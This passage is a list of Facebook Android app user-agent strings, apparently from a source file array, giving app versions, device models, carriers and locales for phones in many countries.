"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Gamcel;FBMF/Itel;FBBD/Itel;FBPN/com.facebook.katana;FBDV/itel it1408;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022707;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239444;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/MPT;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2502;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502135;FBDM/{density=1.0,width=800,height=1232};FBLC/es_LA;FBCR/;FBMF/ECS;FBBD/JP;FBPN/com.facebook.katana;FBDV/TR10CS1;FBSV/4.4.2;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/71.0.0.17.73;FBBV/27002204;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Airtel;FBMF/itel;FBBD/Itel;FBPN/com.facebook.katana;FBDV/itel it1508;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880536;FBDM/{density=1.5,width=540,height=960};FBLC/my_MM;FBCR/MPT;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1707;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/167.0.0.33.94;FBBV/101783969;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/63.0.0.37.81;FBBV/21778670;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MPT;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/1201;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/66.0.0.0.85;FBBV/23262261;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MTN Cameroon;FBMF/Royal;FBBD/Royal;FBPN/com.facebook.katana;FBDV/Royal R2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-L8Plus;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/pt_BR;FBCR/CLARO BR;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H222;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009779;FBDM/{density=1.5,width=480,height=792};FBLC/es_LA;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-M153;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/85.0.0.15.70;FBBV/33678595;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532M;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/64.0.0.52.76;FBBV/22754145;FBDM/{density=1.5,width=480,height=854};FBLC/es_ES;FBCR/TELCEL GSM;FBMF/alps;FBBD/alps;FBPN/com.facebook.katana;FBDV/M4 SS1060;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=4.0,width=1440,height=2560};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/144.0.0.27.91;FBBV/74024807;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/74503935;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1710-02;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/73.0.0.18.66;FBBV/28132076;FBDM/{density=1.5,width=480,height=854};FBLC/fr_FR;FBCR/Orange Cm;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009842;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A8-50LC;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.0.52;FBBV/30370547;FBDM/{density=1.5,width=480,height=854};FBLC/es_ES;FBCR/TIGO;FBMF/verykool;FBBD/verykool;FBPN/com.facebook.katana;FBDV/verykoolS5004;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/71.0.0.0.31;FBBV/26039933;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/TUNISIE TELECOM;FBMF/Cellcom;FBBD/EVERTEK;FBPN/com.facebook.katana;FBDV/EverMiracle S;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Vip MK;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/4013X;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/72.0.0.22.69;FBBV/27550279;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/Vivo;FBMF/Android;FBBD/Android;FBPN/com.facebook.katana;FBDV/J7 Prime;FBSV/6.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/85.0.0.15.70;FBBV/33678624;FBDM/{density=1.5,width=480,height=854};FBLC/it_IT;FBCR/;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/LENNY2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581438;FBDM/{density=1.5,width=540,height=960};FBLC/pt_BR;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/88.0.0.22.76;FBBV/35266889;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBCR/TUNTEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y336-U02;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009794;FBDM/{density=1.5,width=480,height=800};FBLC/pt_BR;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G3502T;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/64.0.0.52.76;FBBV/22754206;FBDM/{density=1.5,width=540,height=960};FBLC/pt_BR;FBCR/TIM 62;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D410;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142893;FBDM/{density=1.3312501,width=800,height=1216};FBLC/hr_HR;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/8079;FBSV/5.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723413;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T599N;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034642;FBDM/{density=2.0,width=720,height=1188};FBLC/ru_RU;FBCR/GCELL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D724;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/80.0.0.21.65;FBBV/31390050;FBDM/{density=2.0,width=720,height=1184};FBLC/sv_SE;FBCR/halebop;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI LYO-L21;FBSV/5.1;FBOP/9;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723422;FBDM/{density=2.0,width=720,height=1184};FBLC/hr_HR;FBCR/m:tel;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723423;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/mt:s;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429874;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J111M;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/166.0.0.45.95;FBBV/100498536;FBDM/{density=2.0,width=720,height=1208};FBLC/it_IT;FBRV/0;FBCR/I TIM;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880428;FBDM/{density=1.0,width=320,height=480};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-X130g;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429824;FBDM/{density=1.5,width=480,height=854};FBLC/it_IT;FBCR/vodafone IT;FBMF/i-INN;FBBD/i-INN;FBPN/com.facebook.katana;FBDV/SQUARE;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/64.0.0.51.76;FBBV/22596764;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G530AZ;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034640;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/Orange F;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530FZ;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/72.0.0.22.69;FBBV/27550336;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530T;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/88.0.0.22.76;FBBV/35266892;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone IT;FBMF/KOMU;FBBD/KOMU;FBPN/com.facebook.katana;FBDV/Komu Color;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.0.27;FBBV/31528336;FBDM/{density=1.5,width=480,height=854};FBLC/ro_RO;FBCR/Digi.Mobil;FBMF/ALLVIEW;FBBD/ALLVIEW;FBPN/com.facebook.katana;FBDV/P5Life;FBSV/4.4.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/Orange;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H220;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/68.0.0.0.20;FBBV/24074715;FBDM/{density=1.5,width=480,height=854};FBLC/fr_FR;FBCR/Credit Mutuel;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI Y550-L01;FBSV/4.4.4;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/VodafoneAL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9301I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/87.0.0.17.79;FBBV/34592777;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G318ML;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034615;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y360-U23;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429881;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/MetroPCS;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5056N;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581400;FBDM/{density=1.0,width=1024,height=552};FBLC/fr_FR;FBCR/;FBMF/eZee'Tab10D11-L;FBBD/Android;FBPN/com.facebook.katana;FBDV/eZee'Tab10D11-L;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/73.0.0.18.66;FBBV/28132076;FBDM/{density=2.0,width=720,height=1184};FBLC/fr_FR;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-UL00;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723413;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G355H;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880455;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TELCEL;FBMF/zte;FBBD/zte;FBPN/com.facebook.katana;FBDV/Z970;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/TELCEL;FBMF/TCT;FBBD/TCT;FBPN/com.facebook.katana;FBDV/ALCATEL ONE TOUCH 5036A;FBSV/4.2.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/80.0.0.21.65;FBBV/31389908;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J111M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/85.0.0.15.70;FBBV/33678595;FBDM/{density=1.5,width=480,height=800};FBLC/pt_BR;FBCR/null;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D325;FBSV/4.4.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI TAG-L03;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880428;FBDM/{density=1.0,width=600,height=1024};FBLC/pt_BR;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T113NU;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142820;FBDM/{density=1.5,width=480,height=800};FBLC/pt_BR;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360M;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429824;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G610-U15;FBSV/4.2.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/64.0.0.52.76;FBBV/22754145;FBDM/{density=1.5,width=480,height=782};FBLC/es_LA;FBCR/Claro;FBMF/BLU;FBBD/BLU;FBPN/com.facebook.katana;FBDV/BLU DASH M2;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/68.0.0.37.59;FBBV/25391163;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI CUN-U29;FBSV/5.1;FBOP/9;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/62.0.0.42.77;FBBV/21376152;FBDM/{density=1.5,width=800,height=1280};FBLC/en_US;FBCR/Mobitel LK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T285YD;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502119;FBDM/{density=1.5,width=480,height=782};FBLC/en_US;FBCR/Mtel;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 310;FBSV/4.2.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009779;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/163.0.0.43.91;FBBV/96845992;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_BR;FBRV/97737839;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Telenor;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5022D;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/163.0.0.43.91;FBBV/96845992;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBRV/97737839;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500H;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/71.0.0.17.73;FBBV/27002112;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T599N;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429824;FBDM/{density=1.5,width=800,height=480};FBLC/it_IT;FBCR/I WIND;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7580;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/66.0.0.33.73;FBBV/23966410;FBDM/{density=1.0,width=1280,height=752};FBLC/sv_SE;FBCR/Tele2;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB2-X30L;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=720,height=1184};FBLC/fr_FR;FBCR/;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/PULP 4G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=2.0,width=720,height=1280};FBLC/nl_NL;FBCR/NL KPN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239453;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532M;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239534;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TELCEL;FBMF/M4TEL;FBBD/alps;FBPN/com.facebook.katana;FBDV/M4 SS4455;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/80.0.0.21.65;FBBV/31390006;FBDM/{density=1.5,width=480,height=786};FBLC/pt_BR;FBCR/VIVO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H342;FBSV/5.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Navigateur Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h",
"[FBAN/FB4A;FBAV/150.0.0.38.138;FBBV/80156280;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/80939760;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107435;FBDM/{density=2.0,width=720,height=1208};FBLC/pt_PT;FBRV/87107435;FBCR/altice MEO;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1187};FBLC/pt_PT;FBRV/85070460;FBCR/MEO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-K350;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
